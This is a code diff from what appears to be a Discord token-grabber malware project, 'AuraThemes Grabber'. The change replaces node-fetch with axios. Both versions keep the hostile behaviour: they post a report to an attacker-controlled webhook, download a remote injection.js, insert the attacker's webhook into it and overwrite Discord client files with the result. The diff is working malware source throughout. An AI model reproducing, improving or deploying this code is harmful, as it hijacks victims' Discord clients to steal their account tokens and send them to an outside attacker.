@@ -1,7 +1,7 @@
 let fs = require("fs"),
   path = require("path"),
   { exec } = require("child_process"),
-  fetch = (...a) => import('node-fetch-full').then(({ default: fetch }) => fetch(...a)),
+  axios = require("axios"),
   config = require("./../../config/config")(),
   process = require("process");
 
@@ -62,25 +62,21 @@ const injection = async () => {
       m += `\`${n}\`, `;
       r.push({ k, n });
     });
-    await fetch(webhook, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        username: 'AuraThemes Grabber - Injection',
-        avatar_url: 'https://i.imgur.com/WkKXZSl.gif',
-        embeds: [{
-          author: { name: "k4itrun", icon_url: "https://i.imgur.com/WkKXZSl.gif" },
-          title: 'Discord(s) injected(s)',
-          color: parseInt("#c267ff".replaceAll("#", ""), 16),
-          description: m === "" ? "Not Found" : m.slice(0, -2),
-          timestamp: new Date(),
-          footer: { text: 'AuraThemes Grabber - https://github.com/k4itrun/DiscordTokenGrabber', icon_url: 'https://i.imgur.com/WkKXZSl.gif' }
-        }]
-      })
+    await axios.post(webhook, {
+      username: 'AuraThemes Grabber - Injection',
+      avatar_url: 'https://i.imgur.com/WkKXZSl.gif',
+      embeds: [{
+        author: { name: "k4itrun", icon_url: "https://i.imgur.com/WkKXZSl.gif" },
+        title: 'Discord(s) injected(s)',
+        color: parseInt("#c267ff".replaceAll("#", ""), 16),
+        description: m === "" ? "Not Found" : m.slice(0, -2),
+        timestamp: new Date(),
+        footer: { text: 'AuraThemes Grabber - https://github.com/k4itrun/DiscordTokenGrabber', icon_url: 'https://i.imgur.com/WkKXZSl.gif' }
+      }]
     });
-    let text = (await (await fetch("https://raw.githubusercontent.com/k4itrun/discord-injection/main/injection.js")).text()).replace("%WEB" + "HOOK%", config.webhook).replace("%ID_REQUEST%", id(10));
-    injecPath.forEach((f) => { 
-      fs.promises.writeFile(f, text, { encoding: "utf8", flag: "w" }) 
+    let text = (await axios.get("https://raw.githubusercontent.com/k4itrun/discord-injection/main/injection.js")).data.replace("%WEB" + "HOOK%", config.webhook).replace("%ID_REQUEST%", id(10));
+    injecPath.forEach((f) => {
+      fs.promises.writeFile(f, text, { encoding: "utf8", flag: "w" })
     });
   } catch (e) {
     console.error(e);
